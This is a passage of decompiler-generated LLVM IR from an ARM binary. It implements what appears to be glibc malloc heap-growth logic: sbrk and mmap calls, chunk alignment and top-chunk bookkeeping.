  store i32 %v3_12d50, i32* %r2.global-to-local, align 4
  %v1_12d54 = add i32 %v3_12d4c, 1
  store i32 %v1_12d54, i32* %r3.global-to-local, align 4
  %v7_12d5c = icmp sgt i32 %v1_12d54, %v3_12d50
  br i1 %v7_12d5c, label %bb147, label %bb148

bb147:                                            ; preds = %.thread27
  store i32 %v1_12d54, i32* %v2_12d50, align 4
  %v0_12d60.pre = load i32, i32* %r3.global-to-local, align 4
  %v1_12d60.pre = load i32, i32* %ip.global-to-local, align 4
  br label %bb148

bb148:                                            ; preds = %.thread27, %bb147
  %v1_12d60 = phi i32 [ %v4_12d48, %.thread27 ], [ %v1_12d60.pre, %bb147 ]
  %v0_12d60 = phi i32 [ %v1_12d54, %.thread27 ], [ %v0_12d60.pre, %bb147 ]
  %v2_12d60 = add i32 %v1_12d60, 848
  %v3_12d60 = inttoptr i32 %v2_12d60 to i32*
  store i32 %v0_12d60, i32* %v3_12d60, align 4
  %v0_12d64 = load i32, i32* %ip.global-to-local, align 4
  %v1_12d64 = add i32 %v0_12d64, 868
  %v2_12d64 = inttoptr i32 %v1_12d64 to i32*
  %v3_12d64 = load i32, i32* %v2_12d64, align 4
  store i32 %v3_12d64, i32* %r3.global-to-local, align 4
  %v1_12d68 = add i32 %v0_12d64, 880
  %v2_12d68 = inttoptr i32 %v1_12d68 to i32*
  %v3_12d68 = load i32, i32* %v2_12d68, align 4
  store i32 %v3_12d68, i32* %r2.global-to-local, align 4
  %v0_12d6c = load i32, i32* @r4, align 4
  %v2_12d6c = add i32 %v0_12d6c, %v3_12d64
  store i32 %v2_12d6c, i32* %r1.global-to-local, align 4
  %v1_12d70 = add i32 %v0_12d64, 872
  %v2_12d70 = inttoptr i32 %v1_12d70 to i32*
  %v3_12d70 = load i32, i32* %v2_12d70, align 4
  store i32 %v3_12d70, i32* %r3.global-to-local, align 4
  %v1_12d78 = add i32 %v0_12d64, 884
  %v2_12d78 = inttoptr i32 %v1_12d78 to i32*
  %v3_12d78 = load i32, i32* %v2_12d78, align 4
  store i32 %v3_12d78, i32* %r2.global-to-local, align 4
  %tmp212 = icmp ugt i32 %v2_12d6c, %v3_12d68
  br i1 %tmp212, label %bb149, label %bb150

bb149:                                            ; preds = %bb148
  store i32 %v2_12d6c, i32* %v2_12d68, align 4
  %v0_12d80.pre = load i32, i32* %r1.global-to-local, align 4
  %v1_12d80.pre = load i32, i32* %ip.global-to-local, align 4
  br label %bb150

bb150:                                            ; preds = %bb148, %bb149
  %v1_12d80 = phi i32 [ %v0_12d64, %bb148 ], [ %v1_12d80.pre, %bb149 ]
  %v0_12d80 = phi i32 [ %v2_12d6c, %bb148 ], [ %v0_12d80.pre, %bb149 ]
  %v2_12d80 = add i32 %v1_12d80, 868
  %v3_12d80 = inttoptr i32 %v2_12d80 to i32*
  store i32 %v0_12d80, i32* %v3_12d80, align 4
  %v0_12d84 = load i32, i32* %r1.global-to-local, align 4
  %v1_12d84 = load i32, i32* %r3.global-to-local, align 4
  %v2_12d84 = add i32 %v1_12d84, %v0_12d84
  store i32 %v2_12d84, i32* %r1.global-to-local, align 4
  %v1_12d88 = load i32, i32* %r2.global-to-local, align 4
  %v0_12d8c = load i32, i32* %lr.global-to-local, align 4
  %v1_12d8c = add i32 %v0_12d8c, 8
  store i32 %v1_12d8c, i32* %r0.global-to-local, align 4
  %tmp213 = icmp ugt i32 %v2_12d84, %v1_12d88
  br i1 %tmp213, label %bb151, label %dec_label_pc_13098

bb151:                                            ; preds = %bb150
  %v5_12d90 = load i32, i32* %ip.global-to-local, align 4
  %v6_12d90 = add i32 %v5_12d90, 884
  %v7_12d90 = inttoptr i32 %v6_12d90 to i32*
  store i32 %v2_12d84, i32* %v7_12d90, align 4
  br label %dec_label_pc_13098

dec_label_pc_12d98:                               ; preds = %dec_label_pc_12cdc, %dec_label_pc_12cbc, %dec_label_pc_12cf0.dec_label_pc_12d98_crit_edge, %dec_label_pc_12ccc
  %v1_12dbc = phi i32 [ %v1_12dbc.pre, %dec_label_pc_12cf0.dec_label_pc_12d98_crit_edge ], [ %v0_12c64, %dec_label_pc_12ccc ], [ %v0_12c64, %dec_label_pc_12cbc ], [ %v0_12c64, %dec_label_pc_12cdc ]
  store i32 32, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_268d4.582 to i32), i32* %ip.global-to-local, align 4
  %v4_12da0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_268d4.582 to i32), i32 32) to i32*), align 4
  store i32 %v4_12da0, i32* %r3.global-to-local, align 4
  %v1_12da4 = add i32 %v4_12da0, 44
  %v2_12da4 = inttoptr i32 %v1_12da4 to i32*
  %v3_12da4 = load i32, i32* %v2_12da4, align 4
  store i32 %v3_12da4, i32* %r0.global-to-local, align 4
  %v1_12da8 = add i32 %v4_12da0, 864
  %v2_12da8 = inttoptr i32 %v1_12da8 to i32*
  %v3_12da8 = load i32, i32* %v2_12da8, align 4
  store i32 %v3_12da8, i32* %r2.global-to-local, align 4
  %v1_12dac = add i32 %v4_12da0, 840
  %v2_12dac = inttoptr i32 %v1_12dac to i32*
  %v3_12dac = load i32, i32* %v2_12dac, align 4
  store i32 %v3_12dac, i32* %r3.global-to-local, align 4
  %v1_12db0 = add i32 %v3_12da4, 4
  %v2_12db0 = inttoptr i32 %v1_12db0 to i32*
  %v3_12db0 = load i32, i32* %v2_12db0, align 4
  store i32 %v3_12db0, i32* %r1.global-to-local, align 4
  %v1_12db8 = urem i32 %v3_12da8, 2
  %v2_12db8 = icmp eq i32 %v1_12db8, 0
  %v1_12db4 = add i32 %v1_12dbc, 16
  %v2_12dbc = add i32 %v1_12db4, %v3_12dac
  store i32 %v2_12dbc, i32* %r3.global-to-local, align 4
  %v1_12dc0 = and i32 %v3_12db0, -4
  store i32 %v1_12dc0, i32* @r8, align 4
  br i1 %v2_12db8, label %bb153, label %bb152

bb152:                                            ; preds = %dec_label_pc_12d98
  %v3_12dc4 = sub i32 %v2_12dbc, %v1_12dc0
  store i32 %v3_12dc4, i32* %r3.global-to-local, align 4
  br label %bb153

bb153:                                            ; preds = %dec_label_pc_12d98, %bb152
  %v0_12dc8 = phi i32 [ %v2_12dbc, %dec_label_pc_12d98 ], [ %v3_12dc4, %bb152 ]
  %v1_12dc8 = load i32, i32* %sb.global-to-local, align 4
  %v2_12dc8 = add i32 %v1_12dc8, %v0_12dc8
  store i32 %v2_12dc8, i32* %r3.global-to-local, align 4
  %v1_12dcc = sub i32 -1, %v1_12dc8
  store i32 %v1_12dcc, i32* %fp.global-to-local, align 4
  %v2_12dd0 = and i32 %v2_12dc8, %v1_12dcc
  store i32 %v2_12dd0, i32* @r5, align 4
  %tmp154 = icmp slt i32 %v2_12dd0, 1
  br i1 %tmp154, label %dec_label_pc_12df4, label %dec_label_pc_12de0

dec_label_pc_12de0:                               ; preds = %bb153
  store i32 %v2_12dd0, i32* %r0.global-to-local, align 4
  %v1_12de4 = call i32 @__GI_sbrk(i32 %v2_12dd0)
  store i32 %v1_12de4, i32* %r0.global-to-local, align 4
  %v3_12de8 = icmp eq i32 %v1_12de4, -1
  store i32 %v1_12de4, i32* @r4, align 4
  br i1 %v3_12de8, label %dec_label_pc_12df4, label %dec_label_pc_12e60

dec_label_pc_12df4:                               ; preds = %dec_label_pc_12de0, %bb153
  store i32 32, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_268d4.582 to i32), i32* %r1.global-to-local, align 4
  %v4_12dfc = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_268d4.582 to i32), i32 32) to i32*), align 4
  store i32 %v4_12dfc, i32* %r6.global-to-local, align 4
  %v1_12e00 = add i32 %v4_12dfc, 864
  %v2_12e00 = inttoptr i32 %v1_12e00 to i32*
  %v3_12e00 = load i32, i32* %v2_12e00, align 4
  store i32 %v3_12e00, i32* %r3.global-to-local, align 4
  %v1_12e04 = urem i32 %v3_12e00, 2
  %v2_12e04 = icmp eq i32 %v1_12e04, 0
  br i1 %v2_12e04, label %.thread29thread-pre-split, label %bb155

bb155:                                            ; preds = %dec_label_pc_12df4
  %v1_12e08 = load i32, i32* @r8, align 4
  %v2_12e08 = load i32, i32* %sb.global-to-local, align 4
  %v3_12e08 = add i32 %v2_12e08, %v1_12e08
  %v2_12e0c = load i32, i32* @r5, align 4
  %v3_12e0c = add i32 %v3_12e08, %v2_12e0c
  store i32 %v3_12e0c, i32* %r3.global-to-local, align 4
  %v2_12e10 = load i32, i32* %fp.global-to-local, align 4
  %v3_12e10 = and i32 %v2_12e10, %v3_12e0c
  store i32 %v3_12e10, i32* @r5, align 4
  br label %.thread29

.thread29thread-pre-split:                        ; preds = %dec_label_pc_12df4
  %v0_12e14.pr = load i32, i32* @r5, align 4
  br label %.thread29

.thread29:                                        ; preds = %.thread29thread-pre-split, %bb155
  %v0_12e14 = phi i32 [ %v0_12e14.pr, %.thread29thread-pre-split ], [ %v3_12e10, %bb155 ]
  %v2_12e14 = icmp ugt i32 %v0_12e14, 1048575
  br i1 %v2_12e14, label %bb157, label %bb156

bb156:                                            ; preds = %.thread29
  store i32 1048576, i32* @r5, align 4
  br label %bb157

bb157:                                            ; preds = %.thread29, %bb156
  %v0_12e2c = phi i32 [ %v0_12e14, %.thread29 ], [ 1048576, %bb156 ]
  %v1_12e1c = load i32, i32* @sl, align 4
  %tmp214 = icmp ugt i32 %v0_12e2c, %v1_12e1c
  br i1 %tmp214, label %dec_label_pc_12e24, label %dec_label_pc_13088

dec_label_pc_12e24:                               ; preds = %bb157
  store i32 0, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 %v0_12e2c, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  store i32 34, i32* %r3.global-to-local, align 4
  %v6_12e40 = call i32 @mmap(i32 0, i32 %v0_12e2c, i32 3, i32 34, i32 0, i32 0)
  store i32 %v6_12e40, i32* %r0.global-to-local, align 4
  %v3_12e44 = icmp eq i32 %v6_12e40, -1
  %v8_12e44 = icmp eq i32 %v6_12e40, -1
  store i32 %v6_12e40, i32* @r4, align 4
  br i1 %v8_12e44, label %.thread32, label %bb158

bb158:                                            ; preds = %dec_label_pc_12e24
  %v1_12e4c = load i32, i32* %r6.global-to-local, align 4
  %v2_12e4c = add i32 %v1_12e4c, 864
  %v3_12e4c = inttoptr i32 %v2_12e4c to i32*
  %v4_12e4c = load i32, i32* %v3_12e4c, align 4
  %v2_12e50 = load i32, i32* @r5, align 4
  %v3_12e50 = add i32 %v2_12e50, %v6_12e40
  store i32 %v3_12e50, i32* %r0.global-to-local, align 4
  %v2_12e54 = and i32 %v4_12e4c, -2
  store i32 %v2_12e54, i32* %r3.global-to-local, align 4
  store i32 %v2_12e54, i32* %v3_12e4c, align 4
  br label %.thread32

.thread32:                                        ; preds = %dec_label_pc_12e24, %bb158
  br i1 %v3_12e44, label %dec_label_pc_12e60, label %dec_label_pc_12e64

dec_label_pc_12e60:                               ; preds = %.thread32, %dec_label_pc_12de0
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_12e64

dec_label_pc_12e64:                               ; preds = %.thread32, %dec_label_pc_12e60
  %v0_12e64 = load i32, i32* @r4, align 4
  %v7_12e64 = icmp eq i32 %v0_12e64, -1
  br i1 %v7_12e64, label %dec_label_pc_13088, label %dec_label_pc_12e6c

dec_label_pc_12e6c:                               ; preds = %dec_label_pc_12e64
  store i32 32, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_268d4.582 to i32), i32* %r2.global-to-local, align 4
  %v4_12e74 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_268d4.582 to i32), i32 32) to i32*), align 4
  store i32 %v4_12e74, i32* %ip.global-to-local, align 4
  store i32 %v3_12da4, i32* %r2.global-to-local, align 4
  %v1_12e7c = add i32 %v4_12e74, 872
  %v2_12e7c = inttoptr i32 %v1_12e7c to i32*
  %v3_12e7c = load i32, i32* %v2_12e7c, align 4
  %v1_12e80 = load i32, i32* @r8, align 4
  %v2_12e80 = add i32 %v1_12e80, %v3_12da4
  store i32 %v2_12e80, i32* %r1.global-to-local, align 4
  %v0_12e84 = load i32, i32* @r5, align 4
  %v2_12e84 = add i32 %v0_12e84, %v3_12e7c
  store i32 %v2_12e84, i32* %r3.global-to-local, align 4
  %v9_12e88 = icmp eq i32 %v0_12e64, %v2_12e80
  br i1 %v9_12e88, label %bb159, label %.thread122

.thread122:                                       ; preds = %dec_label_pc_12e6c
  store i32 %v2_12e84, i32* %v2_12e7c, align 4
  br label %dec_label_pc_12ea4

bb159:                                            ; preds = %dec_label_pc_12e6c
  %v1_12e8c = load i32, i32* %r0.global-to-local, align 4
  %v8_12e8c = icmp eq i32 %v1_12e8c, -1
  store i32 %v2_12e84, i32* %v2_12e7c, align 4
  br i1 %v8_12e8c, label %.thread34, label %dec_label_pc_12ea4

.thread34:                                        ; preds = %bb159
  %v1_12e94 = load i32, i32* @r5, align 4
  %v2_12e94 = load i32, i32* @r8, align 4
  %v3_12e94 = add i32 %v2_12e94, %v1_12e94
  %v2_12e98 = or i32 %v3_12e94, 1
  store i32 %v2_12e98, i32* %r3.global-to-local, align 4
  %v2_12e9c = load i32, i32* %r2.global-to-local, align 4
  %v3_12e9c = add i32 %v2_12e9c, 4
  %v4_12e9c = inttoptr i32 %v3_12e9c to i32*
  store i32 %v2_12e98, i32* %v4_12e9c, align 4
  br label %dec_label_pc_1301c

dec_label_pc_12ea4:                               ; preds = %bb159, %.thread122
  %v0_12ea8.pr = load i32, i32* @r8, align 4
  %v0_12ea4 = load i32, i32* %ip.global-to-local, align 4
  %v1_12ea4 = add i32 %v0_12ea4, 864
  %v2_12ea4 = inttoptr i32 %v1_12ea4 to i32*
  %v3_12ea4 = load i32, i32* %v2_12ea4, align 4
  store i32 %v3_12ea4, i32* %r2.global-to-local, align 4
  %v2_12ea8 = icmp eq i32 %v0_12ea8.pr, 0
  br i1 %v2_12ea8, label %.thread37, label %.thread36

.thread37:                                        ; preds = %dec_label_pc_12ea4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %.thread40

.thread36:                                        ; preds = %dec_label_pc_12ea4
  %v2_12eb0 = urem i32 %v3_12ea4, 2
  store i32 %v2_12eb0, i32* %r3.global-to-local, align 4
  %v2_12eb4 = icmp eq i32 %v2_12eb0, 0
  br i1 %v2_12eb4, label %.thread40, label %dec_label_pc_12ebc

dec_label_pc_12ebc:                               ; preds = %.thread36
  %v0_12ebc = load i32, i32* @r4, align 4
  %v1_12ebc = load i32, i32* %r1.global-to-local, align 4
  %v3_12ebc = icmp ult i32 %v0_12ebc, %v1_12ebc
  br i1 %v3_12ebc, label %bb160, label %.thread40

bb160:                                            ; preds = %dec_label_pc_12ebc
  %v2_12ec0 = and i32 %v3_12ea4, -2
  store i32 %v2_12ec0, i32* %r3.global-to-local, align 4
  store i32 %v2_12ec0, i32* %v2_12ea4, align 4
  br label %.thread40

.thread40:                                        ; preds = %dec_label_pc_12ebc, %.thread37, %.thread36, %bb160
  store i32 32, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_268d4.582 to i32), i32* %ip.global-to-local, align 4
  %v4_12ed0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_268d4.582 to i32), i32 32) to i32*), align 4
  store i32 %v4_12ed0, i32* @r7, align 4
  %v1_12ed4 = add i32 %v4_12ed0, 864
  %v2_12ed4 = inttoptr i32 %v1_12ed4 to i32*
  %v3_12ed4 = load i32, i32* %v2_12ed4, align 4
  store i32 %v3_12ed4, i32* %r3.global-to-local, align 4
  %v1_12ed8 = urem i32 %v3_12ed4, 2
  store i32 %v1_12ed8, i32* @r6, align 4
  %v2_12ed8 = icmp eq i32 %v1_12ed8, 0
  br i1 %v2_12ed8, label %dec_label_pc_12f6c, label %dec_label_pc_12ee0

dec_label_pc_12ee0:                               ; preds = %.thread40
  %v0_12ee0 = load i32, i32* @r8, align 4
  %v2_12ee0 = icmp eq i32 %v0_12ee0, 0
  br i1 %v2_12ee0, label %.thread43, label %bb161

bb161:                                            ; preds = %dec_label_pc_12ee0
  %v2_12ee4 = add i32 %v4_12ed0, 872
  %v3_12ee4 = inttoptr i32 %v2_12ee4 to i32*
  %v4_12ee4 = load i32, i32* %v3_12ee4, align 4
  store i32 %v4_12ee4, i32* %r2.global-to-local, align 4
  %v1_12ee8 = load i32, i32* %r1.global-to-local, align 4
  %v2_12ee8 = load i32, i32* @r4, align 4
  %v3_12ee8 = sub i32 %v2_12ee8, %v1_12ee8
  %v3_12eec = add i32 %v3_12ee8, %v4_12ee4
  store i32 %v3_12eec, i32* %r3.global-to-local, align 4
  store i32 %v3_12eec, i32* %v3_12ee4, align 4
  br label %.thread43

.thread43:                                        ; preds = %dec_label_pc_12ee0, %bb161
  %v0_12ef4 = load i32, i32* @r4, align 4
  %v1_12ef4 = urem i32 %v0_12ef4, 8
  store i32 %v1_12ef4, i32* %r3.global-to-local, align 4
  %v2_12ef4 = icmp eq i32 %v1_12ef4, 0
  br i1 %v2_12ef4, label %.thread44, label %bb162

bb162:                                            ; preds = %.thread43
  %v2_12ef8 = sub nsw i32 8, %v1_12ef4
  store i32 %v2_12ef8, i32* %r3.global-to-local, align 4
  %v3_12efc = add i32 %v2_12ef8, %v0_12ef4
  store i32 %v3_12efc, i32* @r7, align 4
  br label %.thread44

.thread44:                                        ; preds = %.thread43, %bb162
  %v0_12f04 = phi i32 [ 0, %.thread43 ], [ %v2_12ef8, %bb162 ]
  %v1_12f00 = load i32, i32* @r5, align 4
  %v2_12f00 = add i32 %v1_12f00, %v0_12ef4
  store i32 %v2_12f00, i32* @r6, align 4
  %v1_12f04 = load i32, i32* @r8, align 4
  %v2_12f04 = add i32 %v2_12f00, %v0_12f04
  %v2_12f08 = add i32 %v2_12f04, %v1_12f04
  store i32 %v2_12f08, i32* %r1.global-to-local, align 4
  %v1_12f0c = load i32, i32* %sb.global-to-local, align 4
  %v2_12f0c = add i32 %v1_12f0c, %v2_12f08
  %v1_12f10 = load i32, i32* %fp.global-to-local, align 4
  %v2_12f10 = and i32 %v1_12f10, %v2_12f0c
  store i32 %v2_12f10, i32* %r2.global-to-local, align 4
  %v2_12f14 = sub i32 0, %v2_12f00
  store i32 %v2_12f14, i32* %r3.global-to-local, align 4
  %v2_12f18 = sub i32 %v2_12f10, %v2_12f00
  store i32 %v2_12f18, i32* @r5, align 4
  store i32 %v2_12f18, i32* %r0.global-to-local, align 4
  br i1 %v2_12ef4, label %bb163, label %bb164

bb163:                                            ; preds = %.thread44
  store i32 %v0_12ef4, i32* @r7, align 4
  br label %bb164

bb164:                                            ; preds = %.thread44, %bb163
  %v1_12f24 = call i32 @__GI_sbrk(i32 %v2_12f18)
  store i32 %v1_12f24, i32* %r0.global-to-local, align 4
  %v3_12f28 = icmp eq i32 %v1_12f24, -1
  br i1 %v3_12f28, label %dec_label_pc_12f30, label %dec_label_pc_12f40

dec_label_pc_12f30:                               ; preds = %bb164
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_12f34 = call i32 @__GI_sbrk(i32 0)
  store i32 %v1_12f34, i32* %r0.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  br label %dec_label_pc_12f98

dec_label_pc_12f40:                               ; preds = %bb164
  %v1_12f40 = load i32, i32* @r4, align 4
  %v3_12f40 = icmp ult i32 %v1_12f24, %v1_12f40
  br i1 %v3_12f40, label %dec_label_pc_12f48, label %dec_label_pc_12f98

dec_label_pc_12f48:                               ; preds = %dec_label_pc_12f40
  store i32 32, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_268d4.582 to i32), i32* %r0.global-to-local, align 4
  %v4_12f50 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_268d4.582 to i32), i32 32) to i32*), align 4
  store i32 %v4_12f50, i32* %r2.global-to-local, align 4
  %v1_12f54 = add i32 %v4_12f50, 864
  %v2_12f54 = inttoptr i32 %v1_12f54 to i32*
  %v3_12f54 = load i32, i32* %v2_12f54, align 4
  %v0_12f58 = load i32, i32* @r6, align 4
  store i32 %v0_12f58, i32* %r0.global-to-local, align 4
  %v1_12f5c = and i32 %v3_12f54, -2
  store i32 %v1_12f5c, i32* %r3.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  store i32 %v1_12f5c, i32* %v2_12f54, align 4
  br label %dec_label_pc_12f98

dec_label_pc_12f6c:                               ; preds = %.thread40
  %v0_12f6c = load i32, i32* %r0.global-to-local, align 4
  %v3_12f6c = icmp eq i32 %v0_12f6c, -1
  br i1 %v3_12f6c, label %dec_label_pc_12f74, label %dec_label_pc_12f90

dec_label_pc_12f74:                               ; preds = %dec_label_pc_12f6c
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_12f78 = call i32 @__GI_sbrk(i32 0)
  store i32 %v1_12f78, i32* %r0.global-to-local, align 4
  %v0_12f7c = load i32, i32* @r7, align 4
  %v1_12f7c = add i32 %v0_12f7c, 872
  %v2_12f7c = inttoptr i32 %v1_12f7c to i32*
  %v3_12f7c = load i32, i32* %v2_12f7c, align 4
  store i32 %v3_12f7c, i32* %r2.global-to-local, align 4
  %v0_12f80 = load i32, i32* @r4, align 4
  %v0_12f84 = load i32, i32* @r5, align 4
  %v2_12f80 = add i32 %v3_12f7c, %v1_12f78
  %v2_12f84 = sub i32 %v2_12f80, %v0_12f80
  %v2_12f88 = sub i32 %v2_12f84, %v0_12f84
  store i32 %v2_12f88, i32* %r3.global-to-local, align 4
  store i32 %v2_12f88, i32* %v2_12f7c, align 4
  %v0_12f94.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_12f90

dec_label_pc_12f90:                               ; preds = %dec_label_pc_12f6c, %dec_label_pc_12f74
  %v0_12f94 = phi i32 [ 0, %dec_label_pc_12f6c ], [ %v0_12f94.pre, %dec_label_pc_12f74 ]
  %v0_12f90 = load i32, i32* @r4, align 4
  store i32 %v0_12f90, i32* @r7, align 4
  store i32 %v0_12f94, i32* @r5, align 4
  br label %dec_label_pc_12f98

dec_label_pc_12f98:                               ; preds = %dec_label_pc_12f40, %dec_label_pc_12f48, %dec_label_pc_12f30, %dec_label_pc_12f90
  %v0_12f98 = load i32, i32* %r0.global-to-local, align 4
  %v7_12f98 = icmp eq i32 %v0_12f98, -1
  br i1 %v7_12f98, label %dec_label_pc_1301c, label %dec_label_pc_12fa0

dec_label_pc_12fa0:                               ; preds = %dec_label_pc_12f98
  %v1_12fa0 = load i32, i32* @r5, align 4
  %v2_12fa0 = add i32 %v1_12fa0, %v0_12f98
  %v0_12fa4 = load i32, i32* @r7, align 4
  %v2_12fa4 = sub i32 %v2_12fa0, %v0_12fa4
  %v1_12fa8 = or i32 %v2_12fa4, 1
  %v2_12fac = add i32 %v0_12fa4, 4
  %v3_12fac = inttoptr i32 %v2_12fac to i32*
  store i32 %v1_12fa8, i32* %v3_12fac, align 4
  store i32 ptrtoint (i32* @global_var_268d4.582 to i32), i32* %r1.global-to-local, align 4
  store i32 32, i32* %r3.global-to-local, align 4
  %v4_12fb8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_268d4.582 to i32), i32 32) to i32*), align 4
  store i32 %v4_12fb8, i32* @r6, align 4
  %v1_12fbc = add i32 %v4_12fb8, 872
  %v2_12fbc = inttoptr i32 %v1_12fbc to i32*
  %v3_12fbc = load i32, i32* %v2_12fbc, align 4
  %v0_12fc0 = load i32, i32* @r8, align 4
  %v2_12fc0 = icmp eq i32 %v0_12fc0, 0
  %v0_12fc4 = load i32, i32* @r5, align 4
  %v2_12fc4 = add i32 %v0_12fc4, %v3_12fbc
  store i32 %v2_12fc4, i32* %r3.global-to-local, align 4
  store i32 %v2_12fc4, i32* %v2_12fbc, align 4
  %v0_12fcc = load i32, i32* @r7, align 4
  %v1_12fcc = load i32, i32* @r6, align 4
  %v2_12fcc = add i32 %v1_12fcc, 44
  %v3_12fcc = inttoptr i32 %v2_12fcc to i32*
  store i32 %v0_12fcc, i32* %v3_12fcc, align 4
  br i1 %v2_12fc0, label %dec_label_pc_1301c, label %dec_label_pc_12fd4

dec_label_pc_12fd4:                               ; preds = %dec_label_pc_12fa0
  %v0_12fd8 = load i32, i32* @r8, align 4
  %v1_12fd8 = add i32 %v0_12fd8, -12
  %v1_12fdc = and i32 %v1_12fd8, -8
  store i32 %v3_12da4, i32* %ip.global-to-local, align 4
  %v2_12fe4 = add i32 %v1_12fdc, %v3_12da4
  store i32 %v2_12fe4, i32* %r1.global-to-local, align 4
  %v2_12fe8 = icmp ugt i32 %v1_12fdc, 14
  store i32 5, i32* %r2.global-to-local, align 4
  %v1_12ff0 = or i32 %v1_12fdc, 1
  store i32 %v1_12ff0, i32* %r3.global-to-local, align 4
  store i32 %v1_12ff0, i32* %v2_12db0, align 4
  %v0_12ff8 = load i32, i32* %r2.global-to-local, align 4
  %v1_12ff8 = load i32, i32* %r1.global-to-local, align 4
  %v2_12ff8 = add i32 %v1_12ff8, 8
  %v3_12ff8 = inttoptr i32 %v2_12ff8 to i32*
  store i32 %v0_12ff8, i32* %v3_12ff8, align 4
  %v0_12ffc = load i32, i32* %r2.global-to-local, align 4
  %v1_12ffc = load i32, i32* %r1.global-to-local, align 4
  %v2_12ffc = add i32 %v1_12ffc, 4
  %v3_12ffc = inttoptr i32 %v2_12ffc to i32*
  store i32 %v0_12ffc, i32* %v3_12ffc, align 4
  br i1 %v2_12fe8, label %dec_label_pc_13004, label %dec_label_pc_1301c

dec_label_pc_13004:                               ; preds = %dec_label_pc_12fd4
  %v0_13004 = load i32, i32* @r6, align 4
  %v1_13004 = add i32 %v0_13004, 836
  %v2_13004 = inttoptr i32 %v1_13004 to i32*
  %v3_13004 = load i32, i32* %v2_13004, align 4
  store i32 %v3_13004, i32* @r4, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  %v0_1300c = load i32, i32* %ip.global-to-local, align 4
  %v1_1300c = add i32 %v0_1300c, 8
  store i32 %v1_1300c, i32* @r0, align 4
  store i32 -1, i32* %v2_13004, align 4
  %v0_13014 = call i32 @free()
  store i32 %v0_13014, i32* %r0.global-to-local, align 4
  %v0_13018 = load i32, i32* @r4, align 4
  %v1_13018 = load i32, i32* @r6, align 4
  %v2_13018 = add i32 %v1_13018, 836
  %v3_13018 = inttoptr i32 %v2_13018 to i32*
  store i32 %v0_13018, i32* %v3_13018, align 4
  br label %dec_label_pc_1301c

dec_label_pc_1301c:                               ; preds = %.thread34, %dec_label_pc_12fd4, %dec_label_pc_12fa0, %dec_label_pc_12f98, %dec_label_pc_13004
  store i32 32, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_268d4.582 to i32), i32* %r0.global-to-local, align 4
  %v4_13024 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_268d4.582 to i32), i32 32) to i32*), align 4
  store i32 %v4_13024, i32* %lr.global-to-local, align 4
  %v1_13028 = add i32 %v4_13024, 872
  store i32 %v1_13028, i32* %r1.global-to-local, align 4
  %v1_1302c = inttoptr i32 %v1_13028 to i32*
  %v2_1302c = load i32, i32* %v1_1302c, align 4
  store i32 %v2_1302c, i32* %r1.global-to-local, align 4
  %v3_1302c = add i32 %v4_13024, 876
  %v4_1302c = inttoptr i32 %v3_1302c to i32*
  %v5_1302c = load i32, i32* %v4_1302c, align 4
  store i32 %v5_1302c, i32* %r3.global-to-local, align 4
  %v1_13034 = add i32 %v4_13024, 868
  %v2_13034 = inttoptr i32 %v1_13034 to i32*
  %v3_13034 = load i32, i32* %v2_13034, align 4
  store i32 %v3_13034, i32* %r3.global-to-local, align 4
  %v1_13038 = add i32 %v4_13024, 884
  %v2_13038 = inttoptr i32 %v1_13038 to i32*
  %v3_13038 = load i32, i32* %v2_13038, align 4
  store i32 %v3_13038, i32* %r2.global-to-local, align 4
  %v2_1303c = add i32 %v3_13034, %v2_1302c
  store i32 %v2_1303c, i32* %r3.global-to-local, align 4
  %tmp215 = icmp ugt i32 %v2_1302c, %v5_1302c
  br i1 %tmp215, label %bb165, label %bb166

bb165:                                            ; preds = %dec_label_pc_1301c
  store i32 %v2_1302c, i32* %v4_1302c, align 4
  %v0_13044.pre = load i32, i32* %r3.global-to-local, align 4
  %v1_13044.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb166

bb166:                                            ; preds = %dec_label_pc_1301c, %bb165
  %v1_13044 = phi i32 [ %v3_13038, %dec_label_pc_1301c ], [ %v1_13044.pre, %bb165 ]
  %v4_13048 = phi i32 [ %v2_1303c, %dec_label_pc_1301c ], [ %v0_13044.pre, %bb165 ]
  %tmp216 = icmp ugt i32 %v4_13048, %v1_13044
  br i1 %tmp216, label %bb167, label %bb168

bb167:                                            ; preds = %bb166
  %v5_13048 = load i32, i32* %lr.global-to-local, align 4
  %v6_13048 = add i32 %v5_13048, 884
  %v7_13048 = inttoptr i32 %v6_13048 to i32*
  store i32 %v4_13048, i32* %v7_13048, align 4
  br label %bb168

bb168:                                            ; preds = %bb166, %bb167
  %v0_1304c = load i32, i32* %lr.global-to-local, align 4
  %v1_1304c = add i32 %v0_1304c, 44
  %v2_1304c = inttoptr i32 %v1_1304c to i32*
  %v3_1304c = load i32, i32* %v2_1304c, align 4
  store i32 %v3_1304c, i32* %ip.global-to-local, align 4
  %v1_13050 = add i32 %v3_1304c, 4
  %v2_13050 = inttoptr i32 %v1_13050 to i32*
  %v3_13050 = load i32, i32* %v2_13050, align 4
  store i32 %v1_12c64, i32* %r1.global-to-local, align 4
  %v1_13058 = and i32 %v3_13050, -4
  store i32 %v1_13058, i32* %r3.global-to-local, align 4
